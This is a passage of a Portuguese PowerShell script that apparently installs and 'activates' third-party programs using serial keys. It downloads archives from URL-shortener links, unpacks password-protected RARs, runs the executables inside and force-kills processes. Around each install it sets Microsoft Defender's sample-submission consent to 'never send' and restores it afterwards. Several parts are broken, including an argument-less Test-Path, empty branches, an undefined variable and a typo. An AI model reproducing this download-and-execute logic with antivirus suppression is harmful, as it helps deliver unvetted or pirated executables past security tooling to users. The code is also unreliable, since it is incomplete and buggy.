        [string]$TipoPlanoConta,
        [string]$VersaoDisponivel,
        [string]$MetodoSelecionado,
        [string]$LinksProduto,
        [string]$ProcessosProduto,
        [string]$LocalizacaoProduto,
        [string]$InstrucoesAtivacaoProduto,
        [string]$EtapaProcesso
    )
    
    $usuario_atual = $UsuarioAtual
    $nome_programa = $ProdutoSelecionado
    $plano_conta = $TipoPlanoConta
    $versao_disponivel = $VersaoDisponivel
    $metodo_ativacao = $MetodoSelecionado
    $links_produto = $LinksProduto
    $processos_produto = $ProcessosProduto
    $localizacoes_produto = $LocalizacaoProduto
    $instrucoes_usoativacao_produto = $InstrucoesAtivacaoProduto
    $etapa_processo = $EtapaProcesso

    $local_default = "C:\Users\$env:USERNAME\AppData\Local\Temp\$usuario_atual\$nome_programa"

    $pathsToCheck = $null
    $processesToCheck = $null
    $linksProductToCheck = $null
    $stepsAtvToCheck = $null

    foreach ($local_produto in $localizacoes_produto) {

        $detalhes_local_produto = $local_produto -split ","

        $pasta_instalacao_default = $detalhes_local_produto[0].Trim()
        $pasta_instalacao = $detalhes_local_produto[1].Trim()
        $pasta_ativacao = $detalhes_local_produto[2].Trim()
        $exe_instalacao = $detalhes_local_produto[3].Trim()
        $exe_desinstalacao = $detalhes_local_produto[4].Trim()
        $exe_produto_open = $detalhes_local_produto[5].Trim()

        if ($metodo_ativacao -eq "Chave/Serial") {
            # Adicionar local de pastas e .exe diretamente à lista de pastas e .exe
            $pathsToCheck = @{
                "pasta_instalacao_default" = $pasta_instalacao_default
                "pasta_instalacao" = $pasta_instalacao
                "pasta_ativacao" = $pasta_ativacao
                "exe_instalacao" = $exe_instalacao
                "exe_desinstalacao" = $exe_desinstalacao
                "exe_produto_open" = $exe_produto_open
            }
        } else {
            # Adicionar local de pastas e .exe diretamente à lista de pastas e .exe
            $pathsToCheck = @{
                "pasta_instalacao_default" = $pasta_instalacao_default
                "pasta_instalacao" = $pasta_instalacao
                "pasta_ativacao" = $pasta_ativacao
                "exe_instalacao" = $exe_instalacao
                "exe_desinstalacao" = $exe_desinstalacao
            }
        }

        break

        # Verifica se a localização do .exe e pasta foi definido antes de adicionar à lista
        if ($pathsToCheck) {
            break
        }

    }

    foreach ($processo_produto in $processos_produto) {
        
        $detalhes_processo_produto = $processo_produto -split ":"

        $processos_instalacao = $detalhes_processo_produto[0].Trim()
        $processos_ativacao = $detalhes_processo_produto[1].Trim()
        $processos_desinstalacao = $detalhes_processo_produto[2].Trim()

        # Adicionar os processos diretamente à lista de processos
        $processesToCheck = @{
            "instalacao" = $processos_instalacao
            "ativacao" = $processos_ativacao
            "desinstalacao" = $processos_desinstalacao
        }

        break

        # Verifica se o processo foi definido antes de adicionar à lista
        if ($processesToCheck) {
            break
        }
    }

    foreach ($link_produto in $links_produto) {
        
        $detalhes_link_produto = $link_produto -split ","

        if ($link_produto -like "*lc.cx*" -or $link_produto -like "*abrir.link*") {

            $link_setup = $detalhes_link_produto[0].Trim()
            $link_produto = $detalhes_link_produto[1].Trim()
            $link_ativacao_produto = $detalhes_link_produto[2].Trim()
                
            # Adicionar o produto diretamente à lista de produtos disponíveis
            $linksProductToCheck = @{
                "link_setup" = $link_setup
                "link_produto" = $link_produto
                "link_ativacao_produto" = $link_ativacao_produto
            }

            break

        } else {

            $link_produto = $detalhes_link_produto[0].Trim()
            $link_ativacao_produto = $detalhes_link_produto[1].Trim()

            # Adicionar o produto diretamente à lista de produtos disponíveis
            $linksProductToCheck = @{
                "link_produto" = $link_produto
                "link_ativacao_produto" = $link_ativacao_produto
            }

            break

        }
        

        # Verifica se o processo foi definido antes de adicionar à lista
        if ($linksProductToCheck) {
            break
        }
    }

    foreach ($instrucao_usoativacao_produto in $instrucoes_usoativacao_produto) {

        $detalhes_instrucao_usoativacao_produto = $instrucao_usoativacao_produto -split ":"

        $processo_ativacao = $detalhes_instrucao_usoativacao_produto[0].Trim()
        $passo_ativacao  = $detalhes_instrucao_usoativacao_produto[1].Trim()

        $stepsAtvToCheck = @{
            "processo_ativacao" = $processo_ativacao
            "passo_ativacao" = $passo_ativacao
        }

        break

        if ($stepsAtvToCheck) {
            break
        }

    }

    function InstalarPrograma {
        
        param(
            [bool]$EtapaInstAtv
        )
        
        cls

        # Verificação desinstalação completa (verficações de versões anteriores)
        $pasta_instalacao_default = $($pathsToCheck['pasta_instalacao_default'])  

        $produto_formatado = $nome_programa.Trim().ToUpper()
        $fixedWidthEtapaInstalacao = 120  # Largura total da linha

        # Frase a ser centralizada
        $etapaInstalacaoTexto = "ETAPA DE INSTALAÇÃO DO $($produto_formatado)"
        $etapaInstalacaoTextoLength = $etapaInstalacaoTexto.Length

        # Calcula o número de espaços necessários para centralizar
        $spacesNeededEtapaInstalacao = [Math]::Max(([Math]::Floor(($fixedWidthEtapaInstalacao - $etapaInstalacaoTextoLength) / 2)), 0)
        $spacesEtapaInstalacao = " " * $spacesNeededEtapaInstalacao

        Write-Host ""
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host "$spacesEtapaInstalacao$etapaInstalacaoTexto" -ForegroundColor Cyan
        Write-Host "     ================================================================================================================" -ForegroundColor Green


        # Lógica para instalação do programa

        # Função para verificar se os processos estão em execução
        function CheckProcessesRunning {

            foreach ($processoInstall in $processesToCheck['instalacao']) {

                $detalhes_processo_install = $processoInstall -split ","

                $processesToCheck = @($($detalhes_processo_install[0]), $($detalhes_processo_install[1]), $($detalhes_processo_install[2]))
                return Get-Process | Where-Object { $processesToCheck -contains $_.Name }   
            }
        
        }


        if (Test-Path -Path $pasta_instalacao_default -PathType Container) {
            
            $folderFound = $null
            $folderFoundAtual = $false

            # Pasta de instalação do Programa

            foreach ($path in $pathsToCheck) {
    
                # Testa a primeira condição (pasta_instalacao_default)
                $pathsToCheckFolderInstall = $path['pasta_instalacao_default']

                if (Test-Path $pathsToCheckFolderInstall -PathType Container) {
                    $folderFound = $pathsToCheckFolderInstall
                }

                # Testa a segunda condição (pasta_instalacao)
                if (Test-Path $path['pasta_instalacao'] -PathType Container) {
                    $folderFoundAtual = $true
                }

                # Interrompe o laço se uma das condições for atendida
                if ($folderFound -or $folderFoundAtual) {
                    break
                }
            }

            $subfolders = Get-ChildItem -Path $folderFound -Directory -Recurse

            if($subfolders.Count -gt 0) {

                # Itera sobre todas as subpastas e pega seus caminhos completos
                foreach ($subfolder in $subfolders) {
                
                    # $lastSegmentFolderAtual = Split-Path -Path $($pathsToCheck['pasta_instalacao']) -Leaf
                    $subfolderPath = $subfolder.FullName

                    if ($subfolderPath -like $($pathsToCheck['pasta_instalacao'])) {
                        $filesExeInfolderAtual = Get-ChildItem -Path $subfolderPath -File | Where-Object { $_.Extension -eq ".exe" }
                        $filesInSubfolder = Get-ChildItem -Path $subfolderPath -File 
                        $filesInFolder = Get-ChildItem -Path $folderFound -File
                    } else {
                        $filesInFolder = Get-ChildItem -Path $folderFound -File
                    }
                }
            } else {
                $filesInFolder = Get-ChildItem -Path $folderFound -File 
            } 

        } else {

            $folderFound = $null
            $folderFoundAtual = $false

            # Pasta de instalação do Programa

            foreach ($path in $pathsToCheck) {
    
                # Testa a primeira condição (pasta_instalacao_default)
                $pathsToCheckFolderInstall = $path['pasta_instalacao_default']

                if (Test-Path $pathsToCheckFolderInstall -PathType Container) {
                    $folderFound = $pathsToCheckFolderInstall
                }

                # Testa a segunda condição (pasta_instalacao)
                if (Test-Path $path['pasta_instalacao'] -PathType Container) {
                    $folderFoundAtual = $true
                }

                # Interrompe o laço se uma das condições for atendida
                if ($folderFound -or $folderFoundAtual) {
                    break
                }
            }

        }              

        if (($folderFoundAtual -and $filesExeInfolderAtual.Count -ge 2) -or ($folderFoundAtual -and $filesExeInfolderAtual.Count -ge 2 -and $folderFound -and $subfolders.Count -ge 1 -and $filesInSubfolder.Count -gt 2) -or ($folderFound -and $filesInFolder.Count -ge 4)) {
            
            $pasta_instalacao_default = $($pathsToCheck['pasta_instalacao_default'])  
            $exePath_install_atual = $($pathsToCheck['exe_instalacao'])

            $exePath_install_default = [System.IO.Path]::GetFileName($exePath_install_atual)
            $exePath_install_found = Get-ChildItem -Path $pasta_instalacao_default -Recurse -Filter $exePath_install_default -ErrorAction SilentlyContinue

            $firstExePathAnterior = $exePath_install_found[0].FullName

            $versionInfoAnterior = (Get-Item $firstExePathAnterior).VersionInfo
            $programVersionAnterior = $versionInfoAnterior.FileVersion

            foreach ($path in $pathsToCheck) {
                if (Test-Path $($path['pasta_instalacao']) -PathType Container) {
                    $folderFoundAtual = $true
                    break
                }
            }

            if($folderFoundAtual) {

                if ($MetodoSelecionado -eq "Chave/Serial") {

                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host -NoNewline "      Você precisa ter instalado no seu computador, o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host ""  
                    Write-Host ""      
                    Write-Host -NoNewline "      Para que os" -ForegroundColor Yellow
                    Write-Host -NoNewline " 'Dados de Acesso' " -ForegroundColor Magenta
                    Write-Host -NoNewline "disponível para visualização seja compatível e efetiva na sua ativação." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado em seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host ""
                    Write-Host "      Processo de instalação do $nome_programa cancelado." -ForegroundColor Red
                    Write-Host ""

                } else {

                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado em seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host ""
                    Write-Host "      Processo de instalação do $nome_programa cancelado." -ForegroundColor Red
                    Write-Host ""

                }
                
                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

            } else {
                
                if ($MetodoSelecionado -eq "Chave/Serial") {

                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host -NoNewline "      Você precisa ter instalado no seu computador, o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "para que a" -ForegroundColor Yellow
                    Write-Host -NoNewline " 'Chave/Serial' " -ForegroundColor Magenta
                    Write-Host -NoNewline "disponível para visualização seja compatível e efetiva na sua ativação." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado em seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "      Processo de instalação do $nome_programa cancelado." -ForegroundColor Red
                    Write-Host ""
                    Write-Host -NoNewline "      Desinstale a versão anterior e desatualizada do" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                    Write-Host ""

                } else {

                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado em seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      Desinstale a versão anterior do" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                    Write-Host -NoNewline "e instale a versão atual" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$versao_disponivel'." -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host ""
                    Write-Host "      Processo de instalação do $nome_programa cancelado." -ForegroundColor Red
                    Write-Host ""

                }

                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
            }

        } else {

            $processesRunning = CheckProcessesRunning

            if ($processesRunning){

                $processNames = $processesRunning | ForEach-Object { $_.Name }

                foreach ($processName in $processNames) {
                    $process = Get-Process -Name $processName
                    Stop-Process -Id $process.Id -Force
                }

                Write-Host ""
                Write-Host "     ================================================================================================================" -ForegroundColor Red
                Write-Host ""
                Write-Host -NoNewline "      Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                Write-Host -NoNewline " Fechando os processos para iniciar a instalação do" -ForegroundColor Red
                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                Write-Host -NoNewline "em seu computador." -ForegroundColor Red
                Write-Host ""
                Write-Host ""
                           

            } else {

                Write-Host ""
                Write-Host "     ================================================================================================================" -ForegroundColor Green
                Write-Host ""
                Write-Host -NoNewline "      Preparando seu dispositvo para dar início á etapa de instalação do" -ForegroundColor Yellow
                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                Write-Host -NoNewline "em seu computador." -ForegroundColor Yellow
                Write-Host ""
                Write-Host ""
            }
            
            $opcao_instalacao = Read-Host "      Deseja instalar o $nome_programa no seu computador? (S/N)"

            if ($opcao_instalacao -eq 's') {                              

                # Definir a URL do arquivo e o destino
                $nome_file_destino = ($nome_programa -replace '\s', '').ToLower()
                $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"

                $url = $($linksProductToCheck["link_produto"])

                if($url -like "*lc.cx*" -or $url -like "*abrir.link*"){
                    $destino = "$local_default/$nome_file_destino-$versao_disponivel.rar"
                    $nomeArquivo = $($linksProductToCheck["link_setup"]) 
                } else { 
                    $destino = "$local_default/$nome_file_destino-$versao_disponivel.exe" 
                }

                $progam_folder = $($pathsToCheck["pasta_instalacao"])
                
                if ($metodo_ativacao -eq "Chave/Serial") {
                    $program_exe = $($pathsToCheck["exe_produto_open"])
                } else {
                    $program_exe = $($pathsToCheck["exe_instalacao"])
                }
                
                try {

                    $processesRunning = CheckProcessesRunning

                    if ($processesRunning) {

                        Write-Host ""
                        Write-Host "     ================================================================================================================" -ForegroundColor Red       
                        Write-Host ""
                        Write-Host "      Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                        Write-Host "      Fechando os processos para iniciar a instalação..." -ForegroundColor Green
                            
                        $processNames = $processesRunning | ForEach-Object { $_.Name }

                        foreach ($processName in $processNames) {
                            $process = Get-Process -Name $processName
                            Stop-Process -Id $process.Id -Force
                        }


                    } else {

                        if (Test-Path $destino) {
                            
                            Set-MpPreference -SubmitSamplesConsent 2

                            # Inicia o processo de instação
                            
                            Write-Host ""
                            Write-Host -NoNewline "      Instalação oficial de" -ForegroundColor Yellow
                            Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                            Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                            Write-Host ""
                            Write-Host "      Abrindo o instalador de $nome_programa..."   -ForegroundColor Green
                            
                            Start-Sleep -Seconds 5
                            
                            Write-Host ""
                            Write-Host -NoNewline "      Aguardando o processo de instalação do" -ForegroundColor Yellow
                            Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                            Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                            Write-Host ""

                            if ($url -like "*lc.cx*" -or $url -like "*abrir.link*"){
                                
                                # RAR:

                                # Tenta extrair o arquivo específico, assumindo que ele está em uma subpasta
                                $subpasta = "*\"  # Tentativa com qualquer subpasta
                                $arquivoEspecifico = $subpasta + $nomeArquivo

                                $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR

                                # Extraindo apenas o arquivo .exe específico
                                $arguments = "x -y `"$destino`" `"$local_default`" `"$arquivoEspecifico`" -p$senha"
                                Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait

                                $setupEncontrado = Get-ChildItem -Path $local_default -Recurse -Filter $nomeArquivo | Select-Object -First 1

                                if ($setupEncontrado) {

                                    # Caminho completo do arquivo encontrado
                                    $setupCompleto = $setupEncontrado.FullName

                                    if (Test-Path) {


                                    } else {


                                    }
                                    # Mover os arquivos e substitui pelos existentes
                                    Move-Item -Path "$setupCompleto" -Destination $local_default -Force

                                    # Obter o caminho da pasta onde o arquivo foi encontrado
                                    $pastaOriginal = Split-Path -Path $setupCompleto -Parent

                                    Remove-Item -Path $pastaOriginal -Recurse -Force

              
                                    
                                    Start-Process -FilePath "$setupPath" -PassThru -Wait
                                
                                } else {

                                    Write-Host ""
                                    Write-Host "      Setup de instalação do $nome_programa não encontrado..." -ForegroundColor Yellow
                                    Write-Host "      Falha na instalação do $nome_programa..." -ForegroundColor Red
                                    Write-Host ""
                                }

                            } else {
                                
                                # EXE:
                                # Incia e depois Remove o setup do instalador do programa, e aguarda sua conclusão.
                                
                                Start-Process -FilePath $destino -PassThru -Wait

                            }
                                
                            Write-Host ""
                            Write-Host "      Confirme se o $nome_programa foi instalado, e verifique se tudo ocorreu bem." -ForegroundColor Yellow
                            Write-Host ""
                            
                            $instalacao_completa = Read-Host "      Deseja verificar a instalação do $nome_programa ? (S/N)"
                            
                            Write-Host ""

                            if($instalacao_completa -eq 's' -or $instalacao_completa -eq 'n'){

                                # ! Antes verifica que existe uma subpasta na pasta principal do programa.

                                # Verifica se tem alguma subpasta na pasta principal do programa instalado, e se tem arquivos dentro dessa subpasta, bem como se na pasta
                                # principal tem arquivos também.

                                if (Test-Path $progam_folder) {

                                    $subfoldersProgramFolder = Get-ChildItem -Path $progam_folder -Directory 

                                    if($subfoldersProgramFolder.Count -gt 0) {
                                        $subfolderPathProgramFolder = $subfoldersProgramFolder[0].FullName
                                        $filesInSubProgramFolder = Get-ChildItem -Path $subfolderPathProgramFolder -File 
                                        $filesInProgramFolder = Get-ChildItem -Path $progam_folder -File 
                                    } else {
                                        $filesInProgramFolder = Get-ChildItem -Path $progam_folder -File 
                                    }     
                                }
                                   

                                # Verifica se a pasta ainda existe
                                if (((Test-Path $progam_folder) -and $subfoldersProgramFolder.Count -ge 1 -and $filesInSubProgramFolder.Count -gt 2) -or ((Test-Path $progam_folder) -and $filesInProgramFolder.Count -ge 4)) {
                                                
                                    Write-Host "      Instalação de $nome_programa foi concluída com sucesso." -ForegroundColor Green
                                    Write-Host ""
                                                
                                    # Remove o setup de instalação
                                    Remove-Item $destino -Force

                                    $opcao_verficar_instalacao = Read-Host "      Deseja iniciar o $nome_programa para confirmar sua instalação? (S/N)"
                                        
                                    Write-Host ""
                                                    
                                    $processesRunning = CheckProcessesRunning
                                                    
                                    $processNames = $processesRunning | ForEach-Object { $_.Name }

                                    foreach ($processName in $processNames) {
                                        $process = Get-Process -Name $processName
                                        Stop-Process -Id $process.Id -Force
                                    }

                                    if ($opcao_verficar_instalacao -eq 's') {

                                        if (Test-Path $progam_folder) {

                                            Start-Process -FilePath $program_exe -PassThru

                                            Start-Sleep -Seconds 10

                                            Write-Host ""
                                            Write-Host -NoNewline "      Aguardando o processo do" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                            Write-Host -NoNewline "ser finalizado..." -ForegroundColor Yellow
                                            Write-Host ""

                                            function showAfterStartProgram {

                                                if ($MetodoSelecionado -eq "Chave/Serial") {

                                                    #Stop-Process -Id $process.Id
                                                    
                                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                                    Write-Host -NoNewline "para visualizar os dados de acesso do seu" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$nome_program'." -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host ""
                                             
                                                    Set-MpPreference -SubmitSamplesConsent 1

                                                } else {

                                                    #Stop-Process -Id $process.Id
                                                    
                                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                                    Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host ""
                                             
                                                    Set-MpPreference -SubmitSamplesConsent 1

                                                }

                                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                                
                                            }
                                               
                                            # $process = Get-Process -Name "DriverBooster" -ErrorAction SilentlyContinue

                                            $processesRunning = CheckProcessesRunning
                                                    
                                            $processNames = $processesRunning | ForEach-Object { $_.Name }

                                            foreach ($processName in $processNames) {

                                                $process = Get-Process -Name $processName -ErrorAction SilentlyContinue

                                                if ($process) {
                                                    
                                                    $process.WaitForExit()
                                                    showAfterStartProgram
                                                        
                                                } else {
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Processo do" -ForegroundColor Red
                                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                                    Write-Host -NoNewline "não encontrado, ou não está em execução." -ForegroundColor Red
                                                    Write-Host ""
                                                    Write-Host ""

                                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                                } 
                                            }
                                        
                                        } else {
                                            Write-Host ""
                                            Write-Host "      A instalação falhou ou não foi concluída corretamente." -ForegroundColor Red
                                            Write-Host ""

                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                        }
                                    } else {

                                        if ($MetodoSelecionado -eq "Chave/Serial") {

                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                            Write-Host ""
                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                            Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                            Write-Host -NoNewline "para visualizar os dados de acesso do seu" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_program'." -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host ""
                                             
                                            Set-MpPreference -SubmitSamplesConsent 1

                                        } else {

                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                            Write-Host ""
                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                            Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                            Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host ""
                                             
                                            Set-MpPreference -SubmitSamplesConsent 1

                                        }

                                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                    }

                                } else {

                                    Write-Host "      A instalação falhou ou não foi concluída corretamente." -ForegroundColor Red
                                    write-Host -NoNewline "      Algum processo não permitido está em execução, ou o" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "já estava instalado no seu computador." -ForegroundColor Yellow
                                    Write-Host ""
                                    Write-Host ""

                                    # Remove o setup de instalação
                                    Remove-Item $destino -Force

                                    Set-MpPreference -SubmitSamplesConsent 1

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                }
                            } else {
                                
                                if ($MetodoSelecionado -eq "Chave/Serial") {

                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                    Write-Host ""
                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                    Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                    Write-Host -NoNewline "para visualizar os dados de acesso do seu" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_program'." -ForegroundColor Cyan
                                    Write-Host ""
                                    Write-Host ""

                                    Set-MpPreference -SubmitSamplesConsent 1

                                } else {

                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow 
                                    Write-Host ""
                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                    Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                    Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                    Write-Host ""
                                    Write-Host ""

                                    Set-MpPreference -SubmitSamplesConsent 1

                                }

                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }

                        } else {

                            #exit

                            Set-MpPreference -SubmitSamplesConsent 2

                            Write-Host ""
                            Write-Host ""
                            Write-Host -NoNewline "      O instalador de" -ForegroundColor Red
                            Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                            Write-Host -NoNewline "não foi encontrado." -ForegroundColor Red
                            Write-Host ""
                            Write-Host -NoNewline "      Baixando o setup oficial de instalação do" -ForegroundColor Yellow
                            Write-Host -NoNewline " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                            Write-Host ""
                            Write-Host ""
                            Write-Host "      Aguarde alguns minutos..." -ForegroundColor Green
                            Write-Host ""

                            # Baixar o arquivo
                            #$client = New-Object System.Net.WebClient
                            #$client.DownloadFile($url, $destino)

                            try {

                                # Usando Invoke-WebRequest para baixar o arquivo
                                $response = Invoke-WebRequest -Uri "$url" -OutFile "$destino" -ErrorAction Stop 

                                Write-Host ""
                                Write-Host "      $nome_programa baixado com sucesso...." -ForegroundColor Green
                                Write-Host ""
                               
                            } catch {
                                Write-Host ""
                                Write-Host "      Erro ao baixar o $nome_programa" -ForegroundColor Red
                                Write-Host ""
                            }

                            if (Test-Path $destino) {
                                
                                # Inicia o processo de instação
                                
                                Write-Host ""
                                Write-Host -NoNewline "      Instalação oficial de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo o instalador de $nome_programa..."   -ForegroundColor Green
                            
                                Start-Sleep -Seconds 5
                            
                                Write-Host ""
                                Write-Host -NoNewline "      Aguardando o processo de instalação do" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""

                                if ($url -like "*lc.cx*" -or $url -like "*abrir.link*"){
                                    
                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        
                                        $setupEncontrado = Get-ChildItem -Path $local_default -Recurse -Filter $nomeArquivo | Select-Object -First 1

                                        if ($setupEncontrado) {

                                            # Caminho completo do arquivo encontrado
                                            $setupCompleto = $setupEncontrado.FullName
                                            $setupPath = Join-Path $local_default $setupEncontrado.Name

                                            if($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                                Start-Process -FilePath "$setupPath" -PassThru
                                            } else {
                                                Start-Process -FilePath "$setupPath" -PassThru -Wait
                                            }
                                
                                        } else {

                                            # RAR:

                                            # Tenta extrair o arquivo específico, assumindo que ele está em uma subpasta
                                            $subpasta = "*\"  # Tentativa com qualquer subpasta
                                            $arquivoEspecifico = $subpasta + $nomeArquivo

                                            $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR

                                            # Extraindo apenas o arquivo .exe específico
                                            $arguments = "x -y `"$destino`" `"$local_default`" `"$arquivoEspecifico`" -p$senha"
                                            Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait

                                            $setupEncontrado = Get-ChildItem -Path $local_default -Recurse -Filter $nomeArquivo | Select-Object -First 1

                                            if ($setupEncontrado) {

                                                # Caminho completo do arquivo encontrado
                                                $setupCompleto = $setupEncontrado.FullName
                                                $setupPath = Join-Path $local_default $setupEncontrado.Name

                                                # Mover os arquivos e substitui pelos existentes
                                                Move-Item -Path "$setupCompleto" -Destination $local_default -Force

                                                # Obter o caminho da pasta onde o arquivo foi encontrado
                                                $pastaOriginal = Split-Path -Path $setupCompleto -Parent

                                                Remove-Item -Path $pastaOriginal -Recurse -Force

                                                if($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                                    Start-Process -FilePath "$setupPath" -PassThru
                                                } else {
                                                    Start-Process -FilePath "$setupPath" -PassThru -Wait
                                                }

                                            } else {
                                                Write-Host ""
                                                Write-Host "      Setup de instalação do $nome_programa não encontrado..." -ForegroundColor Yellow
                                                Write-Host "      Falha na instalação do $nome_programa..." -ForegroundColor Red
                                                Write-Host ""
                                            }
                                        }

                                    } else {

                                        # RAR:

                                        # Tenta extrair o arquivo específico, assumindo que ele está em uma subpasta
                                        $subpasta = "*\"  # Tentativa com qualquer subpasta
                                        $arquivoEspecifico = $subpasta + $nomeArquivo

                                        $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR

                                        # Extraindo apenas o arquivo .exe específico
                                        $arguments = "x -y `"$destino`" `"$local_default`" `"$arquivoEspecifico`" -p$senha"
                                        Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait

                                        $setupEncontrado = Get-ChildItem -Path $local_default -Recurse -Filter $nomeArquivo | Select-Object -First 1

                                        if ($setupEncontrado) {

                                            # Caminho completo do arquivo encontrado
                                            $setupCompleto = $setupEncontrado.FullName
                                            $setupPath = Join-Path $local_default $setupEncontrado.Name

                                            # Mover os arquivos e substitui pelos existentes
                                            Move-Item -Path "$setupCompleto" -Destination $local_default -Force

                                            # Obter o caminho da pasta onde o arquivo foi encontrado
